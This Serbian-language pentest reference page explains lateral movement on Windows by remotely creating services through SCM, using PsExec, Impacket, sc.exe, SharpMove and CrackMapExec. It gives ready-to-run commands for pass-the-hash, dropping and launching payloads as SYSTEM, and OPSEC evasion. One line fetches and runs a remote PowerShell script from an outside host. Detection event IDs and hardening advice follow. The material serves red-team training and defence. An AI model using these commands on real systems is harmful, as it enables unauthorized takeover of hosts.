# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Kako funkcionišu

Ove tehnike zloupotrebljavaju Windows Service Control Manager (SCM) na daljinu preko SMB/RPC-a radi izvršavanja komandi na ciljnom hostu. Service Control Manager Remote Protocol (SCMR) je interfejs zasnovan na RPC-u za konfigurisanje i upravljanje Windows servisima na udaljenom računaru. Uz dovoljne dozvole, operater može da kreira ili ponovo konfiguriše servis čija putanja binarne datoteke sadrži komandu, a zatim da pokrene taj servis i tako je izvrši na daljinu.<sup>[[5]](#references)</sup> Uobičajeni tok je:

1. Autentifikujte se na ciljnom hostu preko SMB/RPC-a (TCP/445); pristupite ADMIN$ deljenom resursu ako izabrana varijanta treba da tamo smesti datoteku ili preuzme izlaz.
2. Kopirajte izvršnu datoteku ili navedite komandnu liniju sa LOLBAS komandom koju će servis pokrenuti.
3. Kreirajte servis na daljinu preko SCM-a (MS-SCMR preko \PIPE\svcctl) tako da upućuje na tu komandu ili binarnu datoteku.
4. Pokrenite servis da biste izvršili payload i, opciono, uhvatili stdin/stdout preko named pipe-a.
5. Zaustavite servis i očistite za sobom (obrišite servis i sve odložene binarne datoteke).

Zahtevi/preduslovi:
- Lokalna Administratorska prava na ciljnom hostu (SeCreateServicePrivilege) ili eksplicitna prava za kreiranje servisa na ciljnom hostu.
- SMB (445) mora biti dostupan, a Remote Service Management dozvoljen kroz firewall hosta; ADMIN$ mora biti dostupan za varijante koje ga koriste za smeštanje datoteke ili preuzimanje izlaza.
- UAC Remote Restrictions: kod lokalnih naloga, filtriranje tokena može da blokira administratorski pristup preko mreže, osim ako se koristi ugrađeni Administrator nalog ili je LocalAccountTokenFilterPolicy=1.
- Kerberos naspram NTLM-a: korišćenje hostname-a/FQDN-a omogućava Kerberos; povezivanje preko IP adrese često se prebacuje na NTLM (što može biti blokirano u ojačanim okruženjima).

Ako nije naveden nalog servisa, `CreateService` koristi `LocalSystem`, koji ima široke lokalne privilegije. Time se objašnjava veliki uticaj uspešnog SCM izvršavanja. Ono samo po sebi ne onemogućava UAC niti Microsoft Defender: pozivaocu su i dalje potrebna udaljena SCM prava, a kontrole na krajnjoj tački mogu da pregledaju ili blokiraju servis ili payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### Ručni ScExec/WinExec pomoću sc.exe

Sledeći primer prikazuje minimalni pristup kreiranju servisa. Slika servisa može biti odložena EXE datoteka ili LOLBAS kao što su cmd.exe ili powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Napomene:
- Očekujte grešku timeout pri pokretanju EXE datoteke koja nije servis; izvršavanje se ipak odvija.
- Da biste bili više OPSEC-friendly, dajte prednost fileless komandama (cmd /c, powershell -enc) ili obrišite odbačene artefakte.

Detaljnije korake potražite na: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Alati i primeri

### Sysinternals PsExec.exe

- Klasičan administratorski alat koji koristi SMB za postavljanje datoteke PSEXESVC.exe u ADMIN$, instalira privremeni servis (podrazumevani naziv PSEXESVC) i prosleđuje I/O preko imenovanih cevi.
- Primeri upotrebe:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Možete direktno pokrenuti sa Sysinternals Live-a putem WebDAV-a:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Ostavljа događaje instalacije/deinstalacije servisa (ime servisa je često PSEXESVC, osim ako se koristi -r) i tokom izvršavanja kreira C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (PsExec-like)

- Koristi ugrađeni servis nalik RemCom-u. Preko ADMIN$ postavlja privremenu binarnu datoteku servisa (obično nasumičnog naziva), kreira servis (podrazumevano je često RemComSvc) i prosleđuje I/O preko imenovane cevi.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Na Kali-ju, Impacket primeri se mogu nalaziti u direktorijumu `/usr/share/doc/python3-impacket/examples/`. Ako lozinka nije navedena, alat će zatražiti da je unesete. Opcija `-k` u Impacket-u zahteva Kerberos autentifikaciju umesto NTLM-a, obično koristeći trenutni keš akreditiva ili dostavljene akreditive.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefakti
- Privremeni EXE u C:\Windows\ (nasumičnih 8 znakova). Naziv servisa je podrazumevano RemComSvc, osim ako se ne zada drugačije.

### Impacket smbexec.py (SMBExec)

- Kreira privremeni servis koji pokreće cmd.exe i koristi named pipe za I/O. Uglavnom izbegava isporuku punog EXE payload-a; izvršavanje komandi je poluinteraktivno.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementira nekoliko metoda za lateral movement, uključujući izvršavanje zasnovano na servisima.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) podržava autentifikovano udaljeno izvršavanje preko SCM-a i nekoliko drugih Windows mehanizama, uključujući izmenu/kreiranje servisa.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Možete koristiti i CrackMapExec za izvršavanje putem različitih back-endova (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

SCM akcija kreira servis pod nazivom `WindowsDebug` i usmerava ga ka payload-u koji se već nalazi na udaljenom hostu.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, detekcija i artefakti

Tipični artefakti na hostu/mreži pri korišćenju tehnika sličnih PsExec-u:
- Security 4624 (Logon Type 3) i 4672 (Special Privileges) na ciljnom sistemu za korišćeni administratorski nalog.
- Security 5140/5145 File Share i File Share Detailed događaji koji prikazuju pristup ADMIN$ i kreiranje/upisivanje servisnih binarnih datoteka (npr. PSEXESVC.exe ili nasumični .exe naziv od 8 znakova).
- **System** 7045 iz Service Control Manager-a za instalaciju servisa na ciljnom sistemu: nazivi kao što su PSEXESVC, RemComSvc ili prilagođeni nazivi (`-r` / `-service-name`). Ovo potvrđuje da je servis instaliran, ali ne i da je njegova image datoteka pokrenuta. Uporedite vremensku oznaku i putanju image datoteke sa procesnim događajima ili odgovarajućim service-image prefetch unosom, ako je dostupan.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) za services.exe ili image datoteku servisa, 3 (Network Connect), 11 (File Create) u C:\Windows\, 17/18 (Pipe Created/Connected) za pipe-ove kao što su \\.\pipe\psexesvc, \\.\pipe\remcom_* ili nasumične ekvivalente.
- Registry artefakt za Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na hostu operatora (ako nije potisnut).

Ideje za threat hunting
- Postavite upozorenje za instalacije servisa čiji ImagePath sadrži cmd.exe /c, powershell.exe ili lokacije TEMP.
- Potražite kreiranja procesa kod kojih je ParentImage C:\Windows\PSEXESVC.exe ili potomke procesa services.exe koji se izvršavaju kao LOCAL SYSTEM i pokreću shell-ove.
- Označite imenovane pipe-ove koji se završavaju sa -stdin/-stdout/-stderr ili sadrže dobro poznate nazive pipe-ova PsExec klonova.

## Rešavanje uobičajenih problema
- Access is denied (5) pri kreiranju servisa: nalog zapravo nema lokalne administratorske privilegije, aktivna su UAC ograničenja za udaljene lokalne naloge ili EDR zaštita od neovlašćenog menjanja blokira putanju servisne binarne datoteke.
- The network path was not found (53) ili nije moguće povezivanje sa ADMIN$: firewall blokira SMB/RPC ili su administratorski deljeni resursi onemogućeni.
- Kerberos ne uspeva, ali je NTLM blokiran: povežite se koristeći hostname/FQDN (ne IP), proverite da li su SPN-ovi ispravni ili, pri korišćenju Impacket-a, navedite -k/-no-pass uz tikete.
- Isteklo je vreme čekanja pri pokretanju servisa, ali je payload ipak pokrenut: očekivano ako nije reč o pravoj servisnoj binarnoj datoteci; sačuvajte izlaz u datoteku ili koristite smbexec za live I/O.

## Napomene o hardening-u
- Windows 11 24H2 i Windows Server 2025 podrazumevano zahtevaju SMB signing za odlazne veze (i dolazne veze u Windows 11). To ne ometa legitimnu upotrebu PsExec-a sa važećim akreditivima, ali sprečava zloupotrebu unsigned SMB relay-a i može uticati na uređaje koji ne podržavaju signing.<sup>[[2]](#references)</sup>
- Novo blokiranje NTLM-a u SMB klijentu (Windows 11 24H2/Server 2025) može da spreči NTLM fallback pri povezivanju preko IP adrese ili sa serverima koji ne koriste Kerberos. U ojačanim okruženjima to će onemogućiti PsExec/SMBExec zasnovan na NTLM-u; koristite Kerberos (hostname/FQDN) ili podesite izuzetke ako je to legitimno potrebno.<sup>[[2]](#references)</sup>
- Princip najmanjih privilegija: smanjite članstvo u lokalnoj administratorskoj grupi, dajte prednost Just-in-Time/Just-Enough Admin pristupu, nametnite LAPS i nadgledajte/upozoravajte na instalacije servisa 7045.

## Pogledajte i

- Udaljeno izvršavanje zasnovano na WMI-ju (često bez datoteka):

{{#ref}}
./wmiexec.md
{{#endref}}

- Udaljeno izvršavanje zasnovano na WinRM-u:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB bezbednosni hardening u Windows Server 2025 i Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Korišćenje akreditiva za preuzimanje kontrole nad Windows računarima – 2. deo (PSExec i servisi)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Rešavanje problema s neočekivanim ponovnim pokretanjem pomoću sistemskih evidencija događaja](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Pregled protokola Service Control Manager Remote](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Nalog LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - funkcija `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
